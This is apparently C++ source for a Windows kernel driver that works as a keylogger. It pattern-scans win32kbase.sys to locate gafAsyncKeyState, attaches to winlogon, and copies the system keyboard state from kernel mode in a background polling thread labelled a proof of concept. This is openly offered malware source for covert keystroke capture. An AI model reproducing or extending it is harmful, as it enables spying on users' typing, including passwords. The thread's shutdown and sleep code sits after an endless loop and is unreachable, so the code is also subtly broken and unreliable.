#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "WinTypes.hpp"
#include "MemoryUtils.hpp"
#include "DriverMeta.hpp"

#define MOV_RAX_QWORD_BYTE1 0x48
#define MOV_RAX_QWORD_BYTE2 0x8B
#define MOV_RAX_QWORD_BYTE3 0x05

//
// https://github.com/mirror/reactos/blob/c6d2b35ffc91e09f50dfb214ea58237509329d6b/reactos/win32ss/user/ntuser/input.h#L91
//
#define GET_KS_BYTE(vk) ((vk) * 2 / 8)
#define GET_KS_DOWN_BIT(vk) (1 << (((vk) % 4)*2))
#define GET_KS_LOCK_BIT(vk) (1 << (((vk) % 4)*2 + 1))
#define IS_KEY_DOWN(ks, vk) (((ks)[GET_KS_BYTE(vk)] & GET_KS_DOWN_BIT(vk)) ? TRUE : FALSE)
#define IS_KEY_LOCKED(ks, vk) (((ks)[GET_KS_BYTE(vk)] & GET_KS_LOCK_BIT(vk)) ? TRUE : FALSE)
#define SET_KEY_DOWN(ks, vk, down) (ks)[GET_KS_BYTE(vk)] = ((down) ? \
                                                            ((ks)[GET_KS_BYTE(vk)] | GET_KS_DOWN_BIT(vk)) : \
                                                            ((ks)[GET_KS_BYTE(vk)] & ~GET_KS_DOWN_BIT(vk)))
#define SET_KEY_LOCKED(ks, vk, down) (ks)[GET_KS_BYTE(vk)] = ((down) ? \
                                                              ((ks)[GET_KS_BYTE(vk)] | GET_KS_LOCK_BIT(vk)) : \
                                                              ((ks)[GET_KS_BYTE(vk)] & ~GET_KS_LOCK_BIT(vk)))

#include "VK.hpp"

UINT8 KeyStateMap[64]         = { 0 };
UINT8 KeyPreviousStateMap[64] = { 0 };
UINT8 KeyRecentStateMap[64]   = { 0 };

/*
 * @brief Converts a virtual key code (VK) to its corresponding string representation.
 *
 * @param[in] vk Virtual key code.
 *
 * @return CONST CHAR* Corresponding character or key name.
 */
CONST CHAR*
BeVkToChar(_In_ UINT8 vk)
{
    switch (vk)
    {
    case VK_KEY_A:
        return "A";
    case VK_KEY_B:
        return "B";
    case VK_KEY_C:
        return "C";
    case VK_KEY_D:
        return "D";
    case VK_KEY_E:
        return "E";
    case VK_KEY_F:
        return "F";
    case VK_KEY_G:
        return "G";
    case VK_KEY_H:
        return "H";
    case VK_KEY_I:
        return "I";
    case VK_KEY_J:
        return "J";
    case VK_KEY_K:
        return "K";
    case VK_KEY_L:
        return "L";
    case VK_KEY_M:
        return "M";
    case VK_KEY_N:
        return "N";
    case VK_KEY_O:
        return "O";
    case VK_KEY_P:
        return "P";
    case VK_KEY_Q:
        return "Q";
    case VK_KEY_R:
        return "R";
    case VK_KEY_S:
        return "S";
    case VK_KEY_T:
        return "T";
    case VK_KEY_U:
        return "U";
    case VK_KEY_V:
        return "V";
    case VK_KEY_W:
        return "W";
    case VK_KEY_X:
        return "X";
    case VK_KEY_Y:
        return "Y";
    case VK_KEY_Z:
        return "Z";
    case VK_KEY_0:
        return "0";
    case VK_KEY_1:
        return "1";
    case VK_KEY_2:
        return "2";
    case VK_KEY_3:
        return "3";
    case VK_KEY_4:
        return "4";
    case VK_KEY_5:
        return "5";
    case VK_KEY_6:
        return "6";
    case VK_KEY_7:
        return "7";
    case VK_KEY_8:
        return "8";
    case VK_KEY_9:
        return "9";
    case VK_LBUTTON:
        return "LEFT MOUSE BUTTON";
    case VK_RBUTTON:
        return "RIGHT MOUSE BUTTON";
    case VK_CANCEL:
        return "CANCEL";
    case VK_MBUTTON:
        return "MIDDLE MOUSE BUTTON";
    case VK_XBUTTON1:
        return "X1 MOUSE BUTTON";
    case VK_XBUTTON2:
        return "X2 MOUSE BUTTON";
    case VK_BACK:
        return "BACKSPACE";
    case VK_TAB:
        return "TAB";
    case VK_CLEAR:
        return "CLEAR";
    case VK_RETURN:
        return "ENTER";
    case VK_SHIFT:
        return "SHIFT";
    case VK_CONTROL:
        return "CONTROL";
    case VK_MENU:
        return "ALT";
    case VK_PAUSE:
        return "PAUSE";
    case VK_CAPITAL:
        return "CAPS LOCK";
    case VK_ESCAPE:
        return "ESCAPE";
    case VK_SPACE:
        return "SPACEBAR";
    case VK_PRIOR:
        return "PAGE UP";
    case VK_NEXT:
        return "PAGE DOWN";
    case VK_END:
        return "END";
    case VK_HOME:
        return "HOME";
    case VK_LEFT:
        return "LEFT ARROW";
    case VK_UP:
        return "UP ARROW";
    case VK_RIGHT:
        return "RIGHT ARROW";
    case VK_DOWN:
        return "DOWN ARROW";
    case VK_SELECT:
        return "SELECT";
    case VK_PRINT:
        return "PRINT";
    case VK_EXECUTE:
        return "EXECUTE";
    case VK_SNAPSHOT:
        return "PRINT SCREEN";
    case VK_INSERT:
        return "INSERT";
    case VK_DELETE:
        return "DELETE";
    case VK_HELP:
        return "HELP";
    case VK_LWIN:
        return "LEFT WINDOWS";
    case VK_RWIN:
        return "RIGHT WINDOWS";
    case VK_APPS:
        return "APPLICATIONS";
    case VK_SLEEP:
        return "SLEEP";
    case VK_NUMPAD0:
        return "NUMPAD 0";
    case VK_NUMPAD1:
        return "NUMPAD 1";
    case VK_NUMPAD2:
        return "NUMPAD 2";
    case VK_NUMPAD3:
        return "NUMPAD 3";
    case VK_NUMPAD4:
        return "NUMPAD 4";
    case VK_NUMPAD5:
        return "NUMPAD 5";
    case VK_NUMPAD6:
        return "NUMPAD 6";
    case VK_NUMPAD7:
        return "NUMPAD 7";
    case VK_NUMPAD8:
        return "NUMPAD 8";
    case VK_NUMPAD9:
        return "NUMPAD 9";
    case VK_MULTIPLY:
        return "NUMPAD *";
    case VK_ADD:
        return "NUMPAD +";
    case VK_SEPARATOR:
        return "SEPARATOR";
    case VK_SUBTRACT:
        return "NUMPAD -";
    case VK_DECIMAL:
        return "NUMPAD .";
    case VK_DIVIDE:
        return "NUMPAD /";
    case VK_F1:
        return "F1";
    case VK_F2:
        return "F2";
    case VK_F3:
        return "F3";
    case VK_F4:
        return "F4";
    case VK_F5:
        return "F5";
    case VK_F6:
        return "F6";
    case VK_F7:
        return "F7";
    case VK_F8:
        return "F8";
    case VK_F9:
        return "F9";
    case VK_F10:
        return "F10";
    case VK_F11:
        return "F11";
    case VK_F12:
        return "F12";
    case VK_F13:
        return "F13";
    case VK_F14:
        return "F14";
    case VK_F15:
        return "F15";
    case VK_F16:
        return "F16";
    case VK_F17:
        return "F17";
    case VK_F18:
        return "F18";
    case VK_F19:
        return "F19";
    case VK_F20:
        return "F20";
    case VK_F21:
        return "F21";
    case VK_F22:
        return "F22";
    case VK_F23:
        return "F23";
    case VK_F24:
        return "F24";
    case VK_NUMLOCK:
        return "NUM LOCK";
    case VK_SCROLL:
        return "SCROLL LOCK";
    case VK_BROWSER_BACK:
        return "BROWSER BACK";
    case VK_BROWSER_FORWARD:
        return "BROWSER FORWARD";
    case VK_BROWSER_REFRESH:
        return "BROWSER REFRESH";
    case VK_BROWSER_STOP:
        return "BROWSER STOP";
    case VK_BROWSER_SEARCH:
        return "BROWSER SEARCH";
    case VK_BROWSER_FAVORITES:
        return "BROWSER FAVORITES";
    case VK_BROWSER_HOME:
        return "BROWSER HOME";
    case VK_VOLUME_MUTE:
        return "VOLUME MUTE";
    case VK_VOLUME_DOWN:
        return "VOLUME DOWN";
    case VK_VOLUME_UP:
        return "VOLUME UP";
    case VK_MEDIA_NEXT_TRACK:
        return "MEDIA NEXT TRACK";
    case VK_MEDIA_PREV_TRACK:
        return "MEDIA PREVIOUS TRACK";
    case VK_MEDIA_STOP:
        return "MEDIA STOP";
    case VK_MEDIA_PLAY_PAUSE:
        return "MEDIA PLAY/PAUSE";
    case VK_LAUNCH_MAIL:
        return "LAUNCH MAIL";
    case VK_MEDIA_SELECT:
        return "MEDIA SELECT";
    case VK_LAUNCH_APP1:
        return "LAUNCH APPLICATION 1";
    case VK_LAUNCH_APP2:
        return "LAUNCH APPLICATION 2";
    case VK_OEM_1:
        return "OEM 1";
    case VK_OEM_PLUS:
        return "OEM +";
    case VK_OEM_COMMA:
        return "OEM ,";
    case VK_OEM_MINUS:
        return "OEM -";
    case VK_OEM_PERIOD:
        return "OEM .";
    case VK_OEM_2:
        return "OEM 2";
    case VK_OEM_3:
        return "OEM 3";
    case VK_OEM_4:
        return "OEM 4";
    case VK_OEM_5:
        return "OEM 5";
    case VK_OEM_6:
        return "OEM 6";
    case VK_OEM_7:
        return "OEM 7";
    case VK_OEM_8:
        return "OEM 8";
    case VK_OEM_102:
        return "OEM 102";
    case VK_PROCESSKEY:
        return "IME PROCESS";
    case VK_PACKET:
        return "PACKET";
    case VK_ATTN:
        return "ATTN";
    case VK_CRSEL:
        return "CRSEL";
    case VK_EXSEL:
        return "EXSEL";
    case VK_EREOF:
        return "EREOF";
    case VK_PLAY:
        return "PLAY";
    case VK_ZOOM:
        return "ZOOM";
    default:
        return "UNKNOWN";
    }
}

/*
 * @brief Updates the key state map by reading the contents of GafAsyncKeyStateAddr.
 *
 * @param[in] ProcId Process ID of the target process.
 * @param[in] GafAsyncKeyStateAddr Address of the key state structure.
 */
VOID
BeUpdateKeyStateMap(
    _In_ CONST HANDLE& ProcId, 
    _In_ CONST PVOID&  GafAsyncKeyStateAddr
) {
	memcpy(KeyPreviousStateMap, KeyStateMap, 64);

	SIZE_T Size = 0;
	BeGlobals::pMmCopyVirtualMemory(
        BeGetEprocessByPid(HandleToULong(ProcId)),
        GafAsyncKeyStateAddr,
        PsGetCurrentProcess(), 
        &KeyStateMap,
        sizeof(UINT8[64]),
        KernelMode,
        &Size
	);

	for (auto Vk = 0u; Vk < 256; ++Vk) 
	{
        //
        // If key is down but wasnt previously, set it in the recent state as down
        //
        if (IS_KEY_DOWN(KeyStateMap, Vk) && !(IS_KEY_DOWN(KeyPreviousStateMap, Vk)))
        {
	        SET_KEY_DOWN(KeyRecentStateMap, Vk, TRUE);
        }
	}
}

/*
 * @brief Checks if a key was pressed since the last function call.
 *
 * @param[in] Vk Virtual key code.
 *
 * @return BOOLEAN TRUE if the key was pressed, FALSE otherwise.
 */
BOOLEAN
BeWasKeyPressed(_In_ UINT8 Vk)
{
	BOOLEAN result = IS_KEY_DOWN(KeyRecentStateMap, Vk);
	SET_KEY_DOWN(KeyRecentStateMap, Vk, FALSE);
	return result;
}

/*
 * @brief Retrieves the address of gafAsyncKeyState.
 *
 * @return PVOID Address of gafAsyncKeyState.
 */
PVOID
BeGetGafAsyncKeyStateAddress()
{
    //
    // TODO FIXME: THIS IS WINDOWS <= 10 ONLY
    //

    KAPC_STATE Apc = { 0 };

    //
    // Get Address of NtUserGetAsyncKeyState
    //
    DWORD64 NtUserGetAsyncKeyState = (DWORD64)BeGetSystemRoutineAddress("win32kbase.sys", "NtUserGetAsyncKeyState");
    LOG_MSG("NtUserGetAsyncKeyState: 0x%llx\n", NtUserGetAsyncKeyState);
    
    //
    // To read session driver modules (such as win32kbase.sys, which contains NtUserGetAsyncKeyState), we need a process running in a user session 
    // https://www.unknowncheats.me/forum/general-programming-and-reversing/492970-reading-memory-win32kbase-sys.html
    //
    KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);

    PVOID Address = 0;
    INT   I       = 0;

    //
    // Resolve gafAsyncKeyState address
    //
    for (; I < 500; ++I)
    {
        if (
            *(BYTE*)(NtUserGetAsyncKeyState + I) == MOV_RAX_QWORD_BYTE1
            && *(BYTE*)(NtUserGetAsyncKeyState + I + 1) == MOV_RAX_QWORD_BYTE2
            && *(BYTE*)(NtUserGetAsyncKeyState + I + 2) == MOV_RAX_QWORD_BYTE3
        )
        {
            //
            // param for MOV RAX QWORD PTR is the offset to the address of 
            //
            UINT32 Offset = (*(PUINT32)(NtUserGetAsyncKeyState + I + 3));
            
            //
            // 4 = length of offset value
            //
            Address = (PVOID)(NtUserGetAsyncKeyState + I + 3 + 4 + Offset);
    
            LOG_MSG("%02X %02X %02X %lx\n", *(BYTE*)(NtUserGetAsyncKeyState + I), *(BYTE*)(NtUserGetAsyncKeyState + I + 1), *(BYTE*)(NtUserGetAsyncKeyState + I + 2), Offset);
            break;
        }
    }

    if (Address == 0)
    {
        LOG_MSG("Could not resolve gafAsyncKeyState...\n");
    }
    else
    {
        LOG_MSG("Found address to gafAsyncKeyState at offset [NtUserGetAsyncKeyState]+%i: 0x%llx\n", (INT)I, (ULONG_PTR)Address);
    }

    KeUnstackDetachProcess(&Apc);
    return Address;
}

/*
 * @brief Background keylogger thread function that reads directly from gafAsyncKeyStateAddress.
 *
 * @param[in] StartContext Context parameter (unused).
 */
VOID
BeKeyLoggerFunction(_In_ PVOID StartContext)
{
    UNREFERENCED_PARAMETER(StartContext);

    PVOID GasAsyncKeyStateAddr = BeGetGafAsyncKeyStateAddress();

    while(true)
    {
        if (BeGlobals::LogKeys)
        {
            BeUpdateKeyStateMap(BeGlobals::WinLogonPid, GasAsyncKeyStateAddr);

            //
            // Just a poc :)
            //
            if (BeWasKeyPressed(VK_KEY_A))
            {
                LOG_MSG("A key pressed\n");
            }
        }
    }
		
    if (BeGlobals::Shutdown)
    {
        KeSetEvent(&BeGlobals::hKeyLoggerTerminationEvent, IO_NO_INCREMENT, FALSE);
        PsTerminateSystemThread(STATUS_SUCCESS);
    }

    //
    // Sleep for 0.05 seconds
    //
    LARGE_INTEGER Interval;
    Interval.QuadPart = -1 * (LONGLONG)50 * 10000;
    KeDelayExecutionThread(KernelMode, FALSE, &Interval);
}